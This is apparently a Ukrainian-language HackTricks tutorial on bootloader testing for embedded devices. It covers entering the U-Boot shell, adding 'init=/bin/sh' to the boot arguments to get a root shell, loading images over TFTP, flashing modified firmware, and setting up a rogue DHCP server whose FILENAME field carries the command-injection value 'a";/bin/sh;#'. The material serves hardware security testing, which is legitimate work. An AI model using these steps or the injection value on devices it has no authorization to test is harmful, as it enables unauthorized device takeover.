{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
{% endhint %}

Рекомендується виконати наступні кроки для модифікації конфігурацій запуску пристроїв та завантажувачів, таких як U-boot:

1. **Доступ до інтерпретатора завантажувача**:
- Під час завантаження натисніть "0", пробіл або інші виявлені "магічні коди", щоб отримати доступ до інтерпретатора завантажувача.

2. **Модифікація аргументів завантаження**:
- Виконайте наступні команди, щоб додати '`init=/bin/sh`' до аргументів завантаження, що дозволить виконання команд оболонки:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **Налаштування TFTP сервера**:
- Налаштуйте TFTP сервер для завантаження образів через локальну мережу:
%%%
#setenv ipaddr 192.168.2.2 #локальна IP адреса пристрою
#setenv serverip 192.168.2.1 #IP адреса TFTP сервера
#saveenv
#reset
#ping 192.168.2.1 #перевірка доступу до мережі
#tftp ${loadaddr} uImage-3.6.35 #loadaddr приймає адресу для завантаження файлу та ім'я файлу образу на TFTP сервері
%%%

4. **Використання `ubootwrite.py`**:
- Використовуйте `ubootwrite.py` для запису образу U-boot та завантаження модифікованого прошивки для отримання root доступу.

5. **Перевірка функцій налагодження**:
- Перевірте, чи активовані функції налагодження, такі як детальне ведення журналу, завантаження довільних ядер або завантаження з ненадійних джерел.

6. **Обережність при фізичному втручанні**:
- Будьте обережні при підключенні одного контакту до землі та взаємодії з SPI або NAND флеш-чіпами під час послідовності завантаження пристрою, особливо перед розпакуванням ядра. Консультуйтеся з технічними характеристиками NAND флеш-чіпа перед коротким замиканням контактів.

7. **Налаштування підробленого DHCP сервера**:
- Налаштуйте підроблений DHCP сервер з шкідливими параметрами для пристрою, щоб він споживав їх під час PXE завантаження. Використовуйте інструменти, такі як допоміжний сервер DHCP Metasploit (MSF). Змініть параметр 'FILENAME' на команди ін'єкції, такі як `'a";/bin/sh;#'`, щоб перевірити валідацію введення для процедур запуску пристрою.

**Примітка**: Кроки, що передбачають фізичну взаємодію з контактами пристрою (*позначені зірочками), слід виконувати з великою обережністю, щоб уникнути пошкодження пристрою.


## Посилання
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
</details>
{% endhint %}
